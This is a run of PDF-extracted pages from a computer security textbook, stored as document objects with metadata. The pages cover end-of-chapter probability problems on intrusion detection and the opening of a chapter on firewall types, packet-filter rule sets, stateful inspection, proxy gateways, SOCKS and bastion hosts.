disadvantages of using such a tool?  Consider \\nthe problem of determining which files should only change r arely, which files may \\nchange more often and how, and which change frequently and hence cannot be \\nchecked. Consider the amount of work in both the configuration of the program and \\non the system administrator monitoring the responses generated.\\n 8.7 A decentralized NIDS is operating with two nodes in the network monitoring anoma-\\nlous inflows of traffic. In addition, a central node is present, to generate an alarm \\nsignal upon receiving input signals from the two distributed nodes. The signatures of \\ntraffic inflow into the two IDS nodes follow one of four patterns: P1, P2, P3, and P4. \\nThe threat levels are classified by the central node based upon the observed traffic by \\nthe two NIDS at a given time and are given by the following table:\\nThreat Level Signature\\nLow 1 P1 + 1 P2\\nMedium 1 P3 + 1 P4\\nHigh 2 P4\\nIf, at a given time instance, at least one distributed node generates an alarm signal P3, \\nwhat is the probability that the observed traffic in the network will be classified at \\nthreat level “Medium”?\\nM08_STAL0611_04_GE_C08.indd   308 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 310, 'page_label': '309'}, page_content='8.10 / KEY TERMs, REVIEW QuEsTIons, AnD PRoBLEMs  309\\n 8.8 A taxicab was involved in a fatal hit-and-run accident at night. Two cab companies, the \\nGreen and the Blue, operate in the city. You are told that\\n• 85% of the cabs in the city are Green and 15% are Blue.\\n• A witness identified the cab as Blue.\\nThe court tested the reliability of the witness under the same circumstances that \\nexisted on the night of the accident and concluded that the witness was correct in \\nidentifying the color of the cab 80% of the time. What is the probability that the cab \\ninvolved in the incident was Blue rather than Green?\\n Pr[A/H20841B] =\\nPr[AB]\\nPr[B]\\n Pr[A/H20841B] = 1/12\\n3/4 = 1\\n9\\n Pr[A] = a\\nn\\ni =1\\n Pr[A/H20841Ei] Pr[Ei]\\n Pr[Ei /H20841A] =\\nPr[A/H20841Ei]P[Ei]\\nPr[A] =\\nPr[A/H20841Ei]P[Ei]\\na\\nn\\nj =1\\nPr[A/H20841Ej]Pr[Ej]\\nM08_STAL0611_04_GE_C08.indd   309 10/11/17   2:55 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 311, 'page_label': '310'}, page_content='9.1 The Need for Firewalls\\n9.2 Firewall Characteristics and Access Policy\\n9.3 Types of Firewalls\\nPacket Filtering Firewall\\nStateful Inspection Firewalls\\nApplication-Level Gateway\\nCircuit-Level Gateway\\n9.4 Firewall Basing\\nBastion Host\\nHost-Based Firewalls\\nPersonal Firewall\\n9.5 Firewall Location and Configurations\\nDMZ Networks\\nVirtual Private Networks\\nDistributed Firewalls\\nSummary of Firewall Locations and Topologies\\n9.6 Intrusion Prevention Systems\\nHost-Based IPS\\nNetwork-Based IPS\\nDistributed or Hybrid IPS\\nSnort Inline\\n9.7 Example: Unified Threat Management Products\\n9.8 Key Terms, Review Questions, and Problems\\nFirewalls and Intrusion  \\nPrevention Systems\\nCHAPTER \\n \\n310\\nM09_STAL0611_04_GE_C09.indd   310 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 312, 'page_label': '311'}, page_content='9.1 / THE NEED FOR FIREWALLS  311\\nFirewalls can be an effective means of protecting a local system or network of systems \\nfrom network-based security threats while at the same time affording access to the \\noutside world via wide area networks and the Internet.\\n 9.1 THE NEED FOR FIREWALLS\\nInformation systems in corporations, government agencies, and other organizations \\nhave undergone a steady evolution. The following are notable developments:\\n• Centralized data pr ocessing system, with a central mainframe supporting a \\nnumber of directly connected terminals.\\n• Local area networks (LANs) interconnecting PCs and terminals to each other \\nand the mainframe.\\n• Premises network,  consisting of a number of LANs, interconnecting PCs, \\n servers, and perhaps a mainframe or two.\\n• Enterprise-wide network, consisting of multiple, geographically distributed \\npremises networks interconnected by a private wide area network (WAN).\\n• Internet connectivity, in which the various premises networks all hook into the \\nInternet and may or may not also be connected by a private WAN.\\n• Enterprise cloud computing, which we will describe further in Chapter 13, with \\nvirtualized servers located in one or more data centers that can provide both \\ninternal organizational and external Internet accessible services.\\nInternet connectivity is no longer optional for most organizations. The infor -\\nmation and services available are essential to the organization. Moreover, individual \\nusers within the organization want and need Internet access, and if this is not pro -\\nvided via their LAN, they could use a wireless broadband capability from their PC to \\nan Internet service provider (ISP). However, while Internet access provides benefits \\nto the organization, it enables the outside world to reach and interact with local net-\\nwork assets. This creates a threat to the organization. While it is possible to equip each \\nworkstation and server on the premises network with strong security features, such as \\nintrusion protection, this may not be sufficient, and in some cases is not cost-effective. \\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Explain the role of firewalls as part of a computer and network security \\nstrategy.\\n ◆ List the key characteristics of firewalls.\\n ◆ Discuss the various basing options for firewalls.\\n ◆ Understand the relative merits of various choices for firewall location and \\nconfigurations.\\n ◆ Distinguish between firewalls and intrusion prevention systems.\\nM09_STAL0611_04_GE_C09.indd   311 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 313, 'page_label': '312'}, page_content='312  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nConsider a network with hundreds or even thousands of systems, running various \\noperating systems, such as different versions of Windows, MacOS, and Linux. When \\na security flaw is discovered, each potentially affected system must be upgraded to \\nfix that flaw. This requires scaleable configuration management and aggressive patch-\\ning to function effectively. While difficult, this is possible and is necessary if only \\n host-based security is used. A widely accepted alternative or at least complement \\nto host-based security services is the firewall. The firewall is inserted between the \\npremises network and the Internet to establish a controlled link and to erect an outer \\nsecurity wall or perimeter. The aim of this perimeter is to protect the premises net -\\nwork from Internet-based attacks and to provide a single choke point where security \\nand auditing can be imposed. The firewall may be a single computer system or a set \\nof two or more systems that cooperate to perform the firewall function.\\nThe firewall, then, provides an additional layer of defense, insulating the inter-\\nnal systems from external networks. This follows the classic military doctrine of \\n“defense in depth,” which is just as applicable to IT security.\\n 9.2 FIREWALL CHARACTERISTICS AND ACCESS POLICY\\n[BELL94] lists the following design goals for a firewall:\\n1. All traffic from inside to outside, and vice versa, must pass through the fire -\\nwall. This is achieved by physically blocking all access to the local network \\nexcept via the firewall. Various configurations are possible, as explained later \\nin this\\xa0chapter.\\n2. Only authorized traffic, as defined by the local security policy, will be allowed to \\npass. Various types of firewalls are used, which implement various types of security \\npolicies, as explained later in this chapter.\\n3. The firewall itself is immune to penetration. This implies the use of a hardened \\nsystem with a secured operating system, as we will describe in Chapter 12.\\nA critical component in the planning and implementation of a firewall is speci-\\nfying a suitable access policy. This lists the types of traffic authorized to pass through \\nthe firewall, including address ranges, protocols, applications, and content types. This \\npolicy should be developed from the organization’s information security risk assess-\\nment and policy, that we will discuss in Chapters 14 and 15. This policy should be \\ndeveloped from a broad specification of which traffic types the organization needs \\nto support. It is then refined to detail the filter elements we will discuss next, which \\ncan then be implemented within an appropriate firewall topology.\\nNIST SP 800-41 (Guidelines on Firewalls and Firewall Policy, September 2009) \\nlists a range of characteristics that a firewall access policy could use to filter traffic, \\nincluding:\\n• IP Addr ess and Protocol Values:  Controls access based on the source or \\ndestination addresses and port numbers, direction of flow being inbound or \\noutbound, and other network and transport layer characteristics. This type of \\nfiltering is used by packet filter and stateful inspection firewalls. It is typically \\nused to limit access to specific services.\\nM09_STAL0611_04_GE_C09.indd   312 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 314, 'page_label': '313'}, page_content='9.2 / FIREWALL CHARACTERISTICS AND ACCESS POLICy  313\\n• Application Protocol: Controls access on the basis of authorized application \\nprotocol data. This type of filtering is used by an application-level gateway \\nthat relays and monitors the exchange of information for specific application \\n protocols, for example, checking Simple Mail Transfer Protocol (SMTP) e-mail \\nfor spam, or HTTP Web requests to authorized sites only.\\n• User Identity: Controls access based on the users identity, typically for inside \\nusers who identify themselves using some form of secure authentication \\n technology, such as IPSec (see Chapter 22).\\n• Network Activity: Controls access based on considerations such as the time or \\nrequest, for example, only in business hours; rate of requests, for example, to \\ndetect scanning attempts; or other activity patterns.\\nBefore proceeding to the details of firewall types and configurations, it is best to \\nsummarize what one can expect from a firewall. The following capabilities are within \\nthe scope of a firewall:\\n1. A firewall defines a single chok e point that attempts to keep unauthorized \\nusers out of the protected network, prohibit potentially vulnerable services from \\nentering or leaving the network, and provide protection from various kinds \\nof IP spoofing and routing attacks. The use of a single choke point simplifies \\nsecurity management because security capabilities are consolidated on a single \\nsystem or set of systems.\\n2. A firewall provides a location for monitoring security-related events. Audits and \\nalarms can be implemented on the firewall system.\\n3. A firewall is a con venient platform for several Internet functions that are not \\nsecurity related. These include a network address translator, which maps local \\naddresses to Internet addresses, and a network management function that audits \\nor logs Internet usage.\\n4. A firewall can serve as the platform for IPSec. Using the tunnel mode capability \\ndescribed in Chapter 22, the firewall can be used to implement virtual private \\nnetworks.\\nFirewalls have their limitations, including the following:\\n1. The firewall cannot protect against attacks that bypass the firewall. Internal \\nsystems may have wired or mobile broadband capability to connect to an ISP . \\nAn internal LAN may have direct connections to peer organizations that bypass \\nthe firewall.\\n2. The firewall may not protect fully against internal threats, such as a disgrun -\\ntled employee or an employee who unwittingly cooperates with an external \\nattacker.\\n3. An improperly secured wireless LAN may be accessed from outside the organiza-\\ntion. An internal firewall that separates portions of an enterprise network cannot \\nguard against wireless communications between local systems on different sides \\nof the internal firewall.\\n4. A laptop, PDA, or portable storage device may be used and infected outside \\nthe corporate network, then attached and used internally.\\nM09_STAL0611_04_GE_C09.indd   313 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 315, 'page_label': '314'}, page_content='314  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\n 9.3 TYPES OF FIREWALLS\\nA firewall can monitor network traffic at a number of levels, from low-level network \\npackets, either individually or as part of a flow, to all traffic within a transport con -\\nnection, up to inspecting details of application protocols. The choice of which level \\nis appropriate is determined by the desired firewall access policy. It can operate as a \\npositive filter, allowing to pass only packets that meet specific criteria, or as a negative \\nFigure 9.1 Types of Firewalls\\nFirewall\\n(a) General model\\nInternal (protected) network\\n(e.g., enterprise network)\\nExternal (untrusted) network\\n(e.g., Internet)\\nApplication\\nTransport\\nEnd-to-end\\ntransport\\nconnection\\nEnd-to-end\\ntransport\\nconnection\\n(b) Packet filtering firewall\\n(d) Application proxy firewall\\nExternal\\ntransport\\nconnection\\nInternal\\ntransport\\nconnection\\nApplication proxy\\nInternet\\nNetwork\\naccess\\nPhysical\\nApplication\\nTransport\\nInternet\\nNetwork\\naccess\\nPhysical\\nApplication\\nTransport\\nInternet\\nNetwork\\naccess\\nPhysical\\nApplication\\nTransport\\nEnd-to-end\\ntransport\\nconnection\\nEnd-to-end\\ntransport\\nconnection\\nState\\ninfo\\n(c) Stateful inspection firewall\\nInternet\\nNetwork\\naccess\\nPhysical\\n(e) Circuit-level proxy firewall\\nExternal\\ntransport\\nconnection\\nInternal\\ntransport\\nconnection\\nCircuit-level proxy\\nApplication\\nTransport\\nInternet\\nNetwork\\naccess\\nPhysical\\nApplication\\nTransport\\nInternet\\nNetwork\\naccess\\nPhysical\\nM09_STAL0611_04_GE_C09.indd   314 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 316, 'page_label': '315'}, page_content='9.3 / TyPES OF FIREWALLS  315\\nfilter, rejecting any packet that meets certain criteria. The criteria implement the \\naccess policy for the firewall that we discussed in the previous section. Depending \\non the type of firewall, it may examine one or more protocol headers in each packet, \\nthe payload of each packet, or the pattern generated by a sequence of packets. In this \\nsection, we look at the principal types of firewalls.\\nPacket Filtering Firewall\\nA packet filtering firewall  applies a set of rules to each incoming and outgoing \\nIP\\xa0packet and then forward or discards the packet (see Figure 9.1b). The firewall is \\ntypically configured to filter packets going in both directions (from and to the internal \\nnetwork). Filtering rules are based on information contained in a network packet:\\n• Source IP address: The IP address of the system that originated the IP packet \\n(e.g., 192.178.1.1).\\n• Destination IP address: The IP address of the system the IP packet is trying to \\nreach (e.g., 192.168.1.2).\\n• Source and destination transport-level address: The transport-level (e.g., TCP \\nor UDP) port number, which defines applications such as SNMP or HTTP .\\n• IP protocol field: Defines the transport protocol.\\n• Interface: For a firewall with three or more ports, which interface of the fire -\\nwall the packet came from or for which interface of the firewall the packet is \\ndestined.\\nThe packet filter is typically set up as a list of rules based on matches to fields \\nin the IP or TCP header. If there is a match to one of the rules, that rule is invoked to \\ndetermine whether to forward or discard the packet. If there is no match to any rule, \\nthen a default action is taken. Two default policies are possible:\\n• Default /uni003D.bolddiscard: That which is not expressly permitted is prohibited.\\n• Default /uni003D.boldforward: That which is not expressly prohibited is permitted.\\nThe default discard policy is more conservative. Initially, everything is \\nblocked, and services must be added on a case-by-case basis. This policy is more \\nvisible to users, who are more likely to see the firewall as a hindrance. However, \\nthis is the policy likely to be preferred by businesses and government organizations. \\n Further, visibility to users diminishes as rules are created. The default forward \\npolicy increases ease of use for end users but provides reduced security; the secu -\\nrity administrator must, in essence, react to each new security threat as it becomes \\nknown. This policy may be used by generally more open organizations, such as \\nuniversities.\\nTable 9.1 is a simplified example of a rule set for SMTP traffic. The goal is to \\nallow inbound and outbound e-mail traffic but to block all other traffic. The rules are \\napplied top to bottom to each packet. The intent of each rule is:\\n1. Inbound mail from an external source is allowed (port 25 is for SMTP incoming).\\n2. This rule is intended to allow a response to an inbound SMTP connection.\\n3. Outbound mail to an external source is allowed.\\nM09_STAL0611_04_GE_C09.indd   315 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 317, 'page_label': '316'}, page_content='316  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\n4. This rule is intended to allow a response to an outbound SMTP connection.\\n5. This is an explicit statement of the default policy. All rule sets include this rule \\nimplicitly as the last rule.\\nThere are several problems with this rule set. Rule 4 allows external traffic to \\nany destination port above 1023. As an example of an exploit of this rule, an exter -\\nnal attacker can open a connection from the attacker’s port 5150 to an internal Web \\nproxy server on port 8080. This is supposed to be forbidden and could allow an attack \\non the server. To counter this attack, the firewall rule set can be configured with a \\nsource port field for each row. For rules 2 and 4, the source port is set to 25; for rules \\n1 and 3, the source port is set to 71023.\\nBut a vulnerability remains. Rules 3 and 4 are intended to specify that any inside \\nhost can send mail to the outside. A TCP packet with a destination port of 25 is routed \\nto the SMTP server on the destination machine. The problem with this rule is that \\nthe use of port 25 for SMTP receipt is only a default; an outside machine could be \\nconfigured to have some other application linked to port 25. As the revised rule 4 is \\nwritten, an attacker could gain access to internal machines by sending packets with a \\nTCP source port number of 25. To counter this threat, we can add an ACK flag field \\nto each row. For rule 4, the field would indicate that the ACK flag must be set on the \\nincoming packet. Rule 4 would now look like this:\\nRule Direction\\nSrc \\naddress Src port\\nDest \\naddress Protocol Dest port Flag Action\\n4 In External 25 Internal TCP 71023 ACK Permit\\nThe rule takes advantage of a feature of TCP connections. Once a connection \\nis set up, the ACK flag of a TCP segment is set to acknowledge segments sent from \\nthe other side. Thus, this rule allows incoming packets with a source port number of \\n25 that include the ACK flag in the TCP segment.\\nOne advantage of a packet filtering firewall is its simplicity. In addition, packet \\nfilters typically are transparent to users and are very fast. NIST SP 800-41 lists the \\nfollowing weaknesses of packet filter firewalls:\\n• Because packet filter fir ewalls do not examine upper-layer data, they cannot \\nprevent attacks that employ application-specific vulnerabilities or functions. For \\nexample, a packet filter firewall cannot block specific application commands; if \\nRule Direction Src address Dest addresss Protocol Dest port Action\\n1 In External Internal TCP 25 Permit\\n2 Out Internal External TCP 71023 Permit\\n3 Out Internal External TCP 25 Permit\\n4 In External Internal TCP 71023 Permit\\n5 Either Any Any Any Any Deny\\nTable 9.1 Packet-Filtering Examples\\nM09_STAL0611_04_GE_C09.indd   316 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 318, 'page_label': '317'}, page_content='9.3 / TyPES OF FIREWALLS  317\\na packet filter firewall allows a given application, all functions available within \\nthat application will be permitted.\\n• Because of the limited information available to the firewall, the logging func -\\ntionality present in packet filter firewalls is limited. Packet filter logs normally \\ncontain the same information used to make access control decisions (source \\naddress, destination address, and traffic type).\\n• Most packet filter fir ewalls do not support advanced user authentication \\nschemes. Once again, this limitation is mostly due to the lack of upper-layer \\nfunctionality by the firewall.\\n• Packet filter firewalls are generally vulnerable to attacks and exploits that take \\nadvantage of problems within the TCP/IP specification and protocol stack, such \\nas network layer address spoofing . Many packet filter firewalls cannot detect \\na network packet in which the OSI Layer 3 addressing information has been \\naltered. Spoofing attacks are generally employed by intruders to bypass the \\nsecurity controls implemented in a firewall platform.\\n• Finally, due to the small number of variables used in access control decisions, \\npacket filter firewalls are susceptible to security breaches caused by improper \\nconfigurations. In other words, it is easy to accidentally configure a packet filter \\nfirewall to allow traffic types, sources, and destinations that should be denied \\nbased on an organization’s information security policy.\\nSome of the attacks that can be made on packet filtering firewalls and the \\nappropriate countermeasures are the following:\\n• IP address spoofing:  The intruder transmits packets from the outside with a \\nsource IP address field containing an address of an internal host. The attacker \\nhopes that the use of a spoofed address will allow penetration of systems that \\nemploy simple source address security, in which packets from specific trusted \\ninternal hosts are accepted. The countermeasure is to discard packets with an \\ninside source address if the packet arrives on an external interface. In fact, this \\ncountermeasure is often implemented at the router external to the firewall.\\n• Source routing attacks:  The source station specifies the route that a packet \\nshould take as it crosses the Internet, in the hopes that this will bypass security \\nmeasures that do not analyze the source routing information. A countermea -\\nsure is to discard all packets that use this option.\\n• Tiny fragment attacks: The intruder uses the IP fragmentation option to create \\nextremely small fragments and force the TCP header information into a sepa-\\nrate packet fragment. This attack is designed to circumvent filtering rules that \\ndepend on TCP header information. Typically, a packet filter will make a filter-\\ning decision on the first fragment of a packet. All subsequent fragments of that \\npacket are filtered out solely on the basis that they are part of the packet whose \\nfirst fragment was rejected. The attacker hopes the filtering firewall examines \\nonly the first fragment and the remaining fragments are passed through. A tiny \\nfragment attack can be defeated by enforcing a rule that the first fragment of \\na packet must contain a predefined minimum amount of the\\xa0transport header. \\nIf the first fragment is rejected, the filter can remember the packet and discard \\nall subsequent fragments.\\nM09_STAL0611_04_GE_C09.indd   317 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 319, 'page_label': '318'}, page_content='318  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nStateful Inspection Firewalls\\nA traditional packet filter makes filtering decisions on an individual packet basis \\nand does not take into consideration any higher-layer context. To understand what is \\nmeant by context and why a traditional packet filter is limited with regard to context, \\na little background is needed. Most standardized applications that run on top of TCP \\nfollow a client/server model. For example, for the SMTP , e-mail is transmitted from \\na client system to a server system. The client system generates new e-mail messages, \\ntypically from user input. The server system accepts incoming e-mail messages and \\nplaces them in the appropriate user mailboxes. SMTP operates by setting up a TCP \\nconnection between client and server, in which the TCP server port number, which \\nidentifies the SMTP server application, is 25. The TCP port number for the SMTP \\nclient is a number between 1024 and 65535 that is generated by the SMTP client.\\nIn general, when an application that uses TCP creates a session with a remote \\nhost, it creates a TCP connection in which the TCP port number for the remote \\n(server) application is a number less than 1024 and the TCP port number for the \\nlocal (client) application is a number between 1024 and 65535. The numbers less than \\n1024 are the “well-known” port numbers and are assigned permanently to particular \\napplications (e.g., 25 for server SMTP). The numbers between 1024 and 65535 are \\ngenerated dynamically and have temporary significance only for the lifetime of a \\nTCP connection.\\nA simple packet filtering firewall must permit inbound network traffic on all \\nthese high-numbered ports for TCP-based traffic to occur. This creates a vulnerability \\nthat can be exploited by unauthorized users.\\nA stateful packet inspection firewall  tightens up the rules for TCP traffic by \\ncreating a directory of outbound TCP connections, as shown in Table 9.2. There is \\nan entry for each currently established connection. The packet filter will now allow \\nincoming traffic to high-numbered ports only for those packets that fit the profile of \\none of the entries in this directory.\\nSource Address Source Port\\nDestination  \\nAddress Destination Port\\nConnection  \\nState\\n192.168.1.100 1030 210.9.88.29 80 Established\\n192.168.1.102 1031 216.32.42.123 80 Established\\n192.168.1.101 1033 173.66.32.122 25 Established\\n192.168.1.106 1035 177 . 231.32.12 79 Established\\n223.43.21.231 1990 192.168.1.6 80 Established\\n219.22.123.32 2112 192.168.1.6 80 Established\\n210.99.212.18 3321 192.168.1.6 80 Established\\n24.102.32.23 1025 192.168.1.6 80 Established\\n223.21.22.12 1046 192.168.1.6 80 Established\\nTable 9.2 Example Stateful Firewall Connection State Table\\nM09_STAL0611_04_GE_C09.indd   318 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 320, 'page_label': '319'}, page_content='9.3 / TyPES OF FIREWALLS  319\\nA stateful packet inspection firewall reviews the same packet information as \\na packet filtering firewall, but also records information about TCP connections  (see \\nFigure\\xa09.1c). Some stateful firewalls also keep track of TCP sequence numbers to \\nprevent attacks that depend on the sequence number, such as session  hijacking . \\nSome even inspect limited amounts of application data for some well-known pro -\\ntocols such as FTP , IM, and SIPS commands, in order to identify and track related \\nconnections.\\nApplication-Level Gateway\\nAn application-level gateway , also called an application proxy, acts as a relay of \\napplication-level traffic (see Figure 9.1d). The user contacts the gateway using a  \\nTCP/IP application, such as Telnet or FTP , and the gateway asks the user for the \\nname of the remote host to be accessed. When the user responds and provides a \\nvalid user ID and authentication information, the gateway contacts the applica -\\ntion on the remote host and relays TCP segments containing the application data \\nbetween the two endpoints. If the gateway does not implement the proxy code for a \\nspecific application, the service is not supported and cannot be forwarded across the \\nfirewall. Further, the gateway can be configured to support only specific features of \\nan application that the network administrator considers acceptable while denying \\nall other features.\\nApplication-level gateways tend to be more secure than packet filters. Rather \\nthan trying to deal with the numerous possible combinations that are to be allowed \\nand forbidden at the TCP and IP level, the application-level gateway need only scru-\\ntinize a few allowable applications. In addition, it is easy to log and audit all incoming \\ntraffic at the application level.\\nA prime disadvantage of this type of gateway is the additional processing over-\\nhead on each connection. In effect, there are two spliced connections between the \\nend users, with the gateway at the splice point, and the gateway must examine and \\nforward all traffic in both directions.\\nCircuit-Level Gateway\\nA fourth type of firewall is the circuit-level gateway  or circuit-level proxy (see \\nFigure\\xa09.1e). This can be a stand-alone system or it can be a specialized function \\nperformed by an application-level gateway for certain applications. As with an appli-\\ncation gateway, a circuit-level gateway does not permit an end-to-end TCP connec-\\ntion; rather, the gateway sets up two TCP connections, one between itself and a TCP \\nuser on an inner host and one between itself and a TCP user on an outside host. Once \\nthe two connections are established, the gateway typically relays TCP segments from \\none connection to the other without examining the contents. The security function \\nconsists of determining which connections will be allowed.\\nA typical use of circuit-level gateways is a situation in which the system admin-\\nistrator trusts the internal users. The gateway can be configured to support applica-\\ntion-level or proxy service on inbound connections and circuit-level functions for \\noutbound connections. In this configuration, the gateway can incur the processing \\noverhead of examining incoming application data for forbidden functions, but does \\nnot incur that overhead on outgoing data.\\nM09_STAL0611_04_GE_C09.indd   319 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 321, 'page_label': '320'}, page_content='320  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nAn example of a circuit-level gateway implementation is the SOCKS package \\n[KOBL92]; version 5 of SOCKS is specified in RFC 1928. The RFC defines SOCKS \\nin the following fashion:\\nThe protocol described here is designed to provide a framework for client–server \\napplications in both the TCP and UDP domains to conveniently and securely use \\nthe services of a network firewall. The protocol is conceptually a “shim-layer” \\nbetween the application layer and the transport layer, and as such does not \\nprovide network-layer gateway services, such as forwarding of ICMP messages.\\nSOCKS consists of the following components:\\n• The SOCKS server, which often runs on a UNIX-based firewall. SOCKS is also \\nimplemented on Windows systems.\\n• The SOCKS client library, which runs on internal hosts protected by the firewall.\\n• SOCKS-ified versions of several standard client programs such as FTP and \\nTELNET. The implementation of the SOCKS protocol typically involves either \\nthe recompilation or relinking of TCP-based client applications, or the use of \\nalternate dynamically loaded libraries, to use the appropriate encapsulation \\nroutines in the SOCKS library.\\nWhen a TCP-based client wishes to establish a connection to an object that is \\nreachable only via a firewall (such determination is left up to the implementation), it \\nmust open a TCP connection to the appropriate SOCKS port on the SOCKS server \\nsystem. The SOCKS service is located on TCP port 1080. If the connection request \\nsucceeds, the client enters a negotiation for the authentication method to be used, \\nauthenticates with the chosen method, then sends a relay request. The SOCKS server \\nevaluates the request and either establishes the appropriate connection or denies \\nit. UDP exchanges are handled in a similar fashion. In essence, a TCP connection is \\nopened to authenticate a user to send and receive UDP segments, and the UDP seg-\\nments are forwarded as long as the TCP connection is open.\\n 9.4 FIREWALL BASING\\nIt is common to base a firewall on a stand-alone machine running a common operat-\\ning system, such as UNIX or Linux, that may be supplied as a pre-configured security \\nappliance. Firewall functionality can also be implemented as a software module in a \\nrouter or LAN switch, or in a server. In this section, we look at some additional fire-\\nwall basing considerations.\\nBastion Host\\nA bastion host is a system identified by the firewall administrator as a critical strong \\npoint in the network’s security. Typically, the bastion host serves as a platform for \\napplication-level or circuit-level gateways, or to support other services such as IPSec. \\nCommon characteristics of a bastion host are as follows:\\n• The bastion host hardware platform executes a secure version of its operating \\nsystem, making it a hardened system.\\nM09_STAL0611_04_GE_C09.indd   320 10/11/17   2:59 PM'),\n",
